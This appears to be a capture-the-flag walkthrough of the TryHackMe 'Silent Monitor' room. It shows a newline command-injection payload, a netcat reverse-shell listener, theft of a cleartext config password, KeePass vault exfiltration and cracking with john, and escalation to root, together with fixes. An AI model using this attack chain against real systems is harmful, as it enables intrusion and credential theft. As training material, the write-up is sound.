@@ -1,0 +1,150 @@
+---
+title: 'Silent Monitor'
+description: 'An audit log leaks a newline (%0a) command-injection trick against a NOC health-check endpoint; a reverse shell as www-data reads a cleartext service password from a world-readable config, SSH as sysadmin, then crack a KeePass vault to recover the root password.'
+date: 2026-06-24
+platform: tryhackme
+room: 'Silent Monitor'
+roomUrl: 'https://tryhackme.com/room/silent-monitor'
+difficulty: medium
+tags:
+  - 'web'
+  - 'command-injection'
+  - 'linux'
+  - 'password-cracking'
+  - 'privesc'
+vulnClasses:
+  - 'insecure command execution'
+  - 'world-readable secret file'
+  - 'weak credentials'
+translation: done
+draft: false
+---
+
+_A walkthrough of the "Silent Monitor" room from TryHackMe. A network-operations dashboard exposes an internal audit log that quietly tells us how a previous attacker got in — a newline-based command injection in a health-check endpoint. We follow the breadcrumb to a shell, read a service password out of a world-readable config, SSH in as_ _`sysadmin`\*\*, and finish by cracking a KeePass vault to recover the root password._
+
+> Silent Monitor is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. The flags, the service password, the KeePass master password, and the root password are shown as `THM{<redacted>}` / `<redacted>` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+A Flask NOC app on `:5050` exposes `/internal`, whose **audit log** records a prior attacker hitting the health-check endpoint with `127.0.0.1%0awhoami` → that `%0a` (newline) breaks out of a `ping -c 1 <input>` shell command → reproduce it for a **reverse shell as www-data** → read `/opt/netops/secret.config`, which stores a **cleartext backup-agent password** for `sysadmin` → **SSH as sysadmin** (user flag) → in `~/backups` sits `infrastructure.kdbx`; crack its master password with `john` (“spring”) → open the vault to recover the **root password** → `su root` (root flag).
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` shows SSH and a Python/Werkzeug web app billed as a Network Operations Centre:
+
+```text
+22/tcp   open  ssh   OpenSSH 8.9p1 Ubuntu
+5050/tcp open  http  Werkzeug httpd 2.0.2 (Python 3.10.12)   # CorpNet — NOC
+```
+
+Content discovery finds a single interesting route:
+
+```text
+gobuster dir -u http://$IP:5050/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,js,txt,html
+# internal   (Status: 200)
+```
+
+### **The vulnerability**
+
+`/internal` surfaces an **audit log**, and that log is the whole hint: it records earlier probes against the status/health endpoint, including entries like `127.0.0.1%0awhoami`. The health check behind the endpoint builds a shell command roughly like `ping -c 1 <input>` and only validates that the input _starts_ with a valid IP.
+
+<Callout type="insight">
+
+`%0a` is a URL-encoded **newline**. In a shell, a newline terminates one command and starts the next, so `127.0.0.1%0awhoami` runs `ping -c 1 127.0.0.1` **and then** `whoami`. A prefix check (“does it begin with an IP?”) does nothing against an injected second line — the classic weakness of validating the start of a string instead of rejecting shell metacharacters.
+
+</Callout>
+
+### **Step 1 — reproduce the command injection → shell as www-data**
+
+We replay the injection through Burp against the health-check parameter, swapping `whoami` for a reverse shell one-liner. A listener catches it:
+
+```text
+nc -lvnp 4444
+# connect from $IP
+# uid=33(www-data) gid=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### **Step 2 — cleartext service password → SSH as sysadmin (flag)**
+
+The app directory holds a config file that stores a backup-agent password in **plaintext**, and it runs as `sysadmin`:
+
+```text
+www-data@...:/opt/netops$ cat secret.config
+# [backup_agent]
+# run_as   = sysadmin
+# password = <redacted>
+```
+
+That password works straight over SSH:
+
+```text
+ssh sysadmin@$IP
+sysadmin@...:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Step 3 — crack the KeePass vault → root (flag)**
+
+`sysadmin`'s home has a `backups/` directory containing `infrastructure.kdbx` (a KeePass credential database) and a README describing it. Pull it back to the attacker box:
+
+```text
+# on target
+sysadmin@...:~/backups$ python3 -m http.server 8000
+# on attacker
+wget http://$IP:8000/infrastructure.kdbx
+```
+
+The stock `keepass2john` choked on the KDBX 4 format, so use the one from a current `john` build, then crack with rockyou:
+
+```text
+~/john/run/keepass2john infrastructure.kdbx > keepass.hash   # value redacted
+~/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+# <redacted>   (infrastructure)
+```
+
+The recovered master password (a single rockyou word) unlocks the vault, which stores the **root** account's password. Switch user and grab the final flag:
+
+```text
+sysadmin@...:~/backups$ su root
+root@...:~# cat /root/root.txt
+THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). The unauthenticated health-check endpoint allows arbitrary command execution as the web user. A world-readable config then hands over a working `sysadmin` SSH password, and a weakly-protected KeePass vault yields the root password — a straight line from an anonymous HTTP request to full root on the host.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+- **Never build shell commands from user input.** Validate the target as a real IP/hostname and call the API without a shell (e.g. a library ping), or pass arguments as an array — never concatenate into a shell string. Reject newlines and shell metacharacters outright rather than prefix-matching.
+- **Don’t store passwords in plaintext config files**, and lock down permissions so the web user can’t read service credentials.
+- **Protect credential vaults with strong master passwords** (a single rockyou word is not one) and keep backups off reachable paths.
+- **Don’t expose the internal audit log** — it handed the attacker the exact payload.
+
+</Callout>
+
+### **Takeaways**
+
+- **Read the logs the app shows you.** The audit trail literally documented the intended exploit.
+- **Prefix validation is not input validation.** Checking that a string _starts_ with an IP does nothing about what comes after a newline.
+- **Plaintext service credentials turn a web-user shell into lateral movement**, and a weak KeePass password turns a backup file into root.
+
+Silent Monitor is a neat lesson in letting the defender’s own telemetry guide the attack. Thanks for reading.
